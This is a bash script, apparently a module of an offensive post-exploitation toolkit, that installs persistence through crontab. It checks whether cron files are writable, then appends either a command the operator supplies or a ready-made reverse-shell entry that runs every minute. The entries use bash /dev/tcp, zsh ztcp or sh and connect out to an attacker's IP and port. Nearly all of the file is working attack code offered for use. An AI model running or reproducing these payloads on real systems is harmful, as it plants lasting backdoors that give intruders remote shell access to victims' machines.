#!/usr/bin/env bash

# --- all vars are exported in main script line:71 --- 
# shellcheck disable=SC2154

# --- Scheduler Persistance ---
echo -e "${RED}$(line)${EOC}"
echo -e "${RED}[1]${EOC} - Crontab"
echo -e "$(line)"
echo -e "${RED}[0]${EOC} - ${RED}Return${EOC} to menu"
echo -e "${RED}$(line)${EOC}"

while true; 
do
read -rp $'\033[0;91m[?]\e[0m Enter your choice > ' cron_choice

case $cron_choice in
1) # --- Crontab Persistence func ---
    cron_example="
    ${BOLD}[*] Example of job definition:${EOC}
        .---------------- minute (0 - 59)
        |  .------------- hour (0 - 23)
        |  |  .---------- day of month (1 - 31)
        |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
        |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
        |  |  |  |  |
    ${RED}    *  *  *  *  * user-name   command to be executed${EOC} 
    ${BOLD}    5  *  *  *  *   root      /bin/nc 127.0.0.1 4444${EOC}     
    " 

    # --- Checking premissions of crontab stuff (files & dirs) ---
    # --- Edit this array to your needs ---  
    cron_stuff=("/etc/crontab" "/var/spool/cron/crontabs/$USER/");

    for cron_stuff_check in "${cron_stuff[@]}"; do
        sleep 0.3
        if [ -w "$cron_stuff_check" ]; then
            echo -e "${RED}[+]${EOC} Crontab file or directory - ${RED}$cron_stuff_check${EOC} is ${RED}writeable${EOC}"
        elif [ -f "$cron_stuff_check" ]; then   
            echo -e "${RED}[x]${EOC} Crontab file or directory - ${RED}$cron_stuff_check${EOC} is ${RED}not writeable${EOC} for current logged user ${RED}${USER}${EOC}."
        elif [ -d "$cron_stuff_check" ]; then
                continue
        else
            echo -e "${RED}[x]${EOC} Crontab file or directory - ${RED}$cron_stuff_check${EOC} not found or ${RED}permission denied${EOC} for current user ${RED}${USER}${EOC} \n\t"    
            mkdir -p "$cron_stuff_check" && echo -e "${RED}$cron_stuff_check${EOC} has been ${RED}successufly${EOC} created "
        fi;
    done

    echo

    # --- Custom crontab command ---
    read -rp $'\033[0;91m[?]\e[0m Do u want to \033[0;91madd custom command\e[0m to crontab [ y \ n ] > ' cron_choice
    if [[ "$cron_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then
        echo -e "$cron_example" && echo
        read -rp $'\033[0;91m[*]\e[0m Enter your custom command > ' cron_command
        # --- Custom cron command based on priv ---
        if [[ "$priv_status" == "is_su" && -n "$cron_command" ]]; then
            echo "$cron_command" | tee -a "${cron_stuff[0]}" && echo -e "${RED}[+]${EOC} ${RED}$cron_command${EOC} successfully added to ${RED}${cron_stuff[0]${EOC}}"
        elif [[ "$priv_status" == "not_su" && -n "$cron_command" ]]; then
            echo "$cron_command" | crontab - && echo -e "${RED}[+]${EOC} ${RED}$cron_command${EOC} successfully added to ${RED}$USER${EOC}'s crontab"
        else
            echo "${RED}[x]${EOC} Something went wrong while ${RED}checking permissions${EOC} or ${RED}input is empty${EOC}"
            sched_func
        fi;
        # --- Default user custom payload based on user's interpretator --- 
    elif [[ "$cron_choice" =~ ^[Nn]|[Nn][Oo]$ ]]; then
        # --- Validation of input ---
        read -rp $'\033[0;91m[*]\e[0m Enter IP or domain for basic TCP > ' cron_ip
        if [[ -z "$cron_ip" ]]; then 
            echo "${RED}[x]${EOC} IP or domain cannot be empty."
            sched_func
        else 
            if [[ "$cron_ip" =~ [a-zA-Z] ]]; then
                domain_to_ip=$(dig +short "$cron_ip" | head -n 1)    
                if [[ -n "$domain_to_ip" ]]; then
                cron_ip="$domain_to_ip"
                echo -e "${RED}[+]${EOC} Resolved domain to IP: ${RED}$cron_ip${EOC}"
            else
                echo "${RED}[x]${EOC} Unable to resolve the ${RED}domain to IP${EOC}. Please enter a ${RED}valid IP${EOC} or make sure the ${RED}domain is resolvable${EOC}."; 
                sched_func
        fi; fi; fi;

        read -rp $'\033[0;91m[*]\e[0m Enter PORT > ' cron_port
        if [ "$current_shell" == "/bin/bash" ] || [ "$current_shell" == "/usr/bin/bash" ]; then 
            # --- Bash rev shell payload ---
                cron_payload="* * * * * $USER bash -c '0<&33-;exec 33<>/dev/tcp/$cron_ip/$cron_port;sh <&33 >&33 2>&33'"
                if [[ "$priv_status" == "is_su" ]]; then
                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e "${RED}[+]${EOC}Payload ${RED}successufly${EOC} added to ${RED}${cron_stuff[0]}${EOC}"
                    sched_func   
                else
                    echo "$cron_payload" | crontab - && echo -e "${RED}[+]${EOC}Payload ${RED}successfully${EOC} added to ${RED}$USER's${EOC} crontab"
                    sched_func
                fi;
            # --- Zsh rev shell payload ---
            elif [ "$current_shell" == "/bin/zsh" ] || [ "$current_shell" == "/usr/bin/zsh" ]; then 
                cron_payload="* * * * * $USER zsh -c 'zmodload zsh/net/tcp && ztcp $cron_ip $cron_port && zsh >&\$REPLY' 2>&\$REPLY' 0>&\$REPLY' > /dev/null &"
                if [[ "$priv_status" == "is_su" ]]; then
                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e "${RED}[+]${EOC}Payload ${RED}successufly${EOC} added to ${RED}${cron_stuff[0]}${EOC}"
                    sched_func
                else
                    echo "$cron_payload" | crontab - && echo -e "${RED}[+]${EOC}Payload ${RED}successfully${EOC} added to ${RED}$USER's${EOC} crontab"
                    sched_func
                fi;
            # --- Sh rev shell payload ---
            elif [ "$current_shell" == "/bin/sh" ] || [ "$current_shell" == "/usr/bin/sh" ] ; then 
                cron_payload="* * * * * $USER 0<&196;exec 196<>/dev/tcp/$cron_ip/$cron_port; sh <&196 >&196 2>&196"
                if [[ "$priv_status" == "is_su" ]]; then
                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e "${RED}[+]${EOC}Payload ${RED}successufly${EOC} added to ${RED}${cron_stuff[0]}${EOC}"
                    sched_func
                else
                    echo "$cron_payload" | crontab - && echo -e "${RED}[+]${EOC}Payload ${RED}successfully${EOC} added to ${RED}$USER's${EOC} crontab"
                    sched_func
                fi;
        else
            # --- Giving link of cheatsheet if user's interpertator is unknown --- 
            echo -e "${RED}[x]${EOC} ${RED}Reverse-shell${EOC} command for ${RED}$USER's${EOC} default shell${RED}(\"$current_shell\")${EOC} is ${RED}unknown${EOC}. ${RED}Supported${EOC} shells are - ${RED}sh, bash & zsh.${EOC} \n"
            echo -e "${RED}[!]${EOC} ${RED}Take a look${EOC} at this cheet-sheet & ${RED}manually add${EOC} it to crontab based on your shell - ${RED}(\"$current_shell\")${EOC}\n" 
            echo -e "${RED}[*]${EOC} https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/ \n"
            sched_func
        fi;
    else
        echo -e "\n${RED}[x]${EOC} No option has been seleted\n" && sleep 0.5
        sched_func
    fi;;
0|[Qq]|[Qq][Uu][Ii][Tt])
    echo -e "${RED}[+]${EOC} Going back to main menu"
    sleep 0.5 && break && return 0;;
*) 
    echo -e "${RED}[x]${EOC} Enter valid option \n"
    sched_func;;
esac;
done;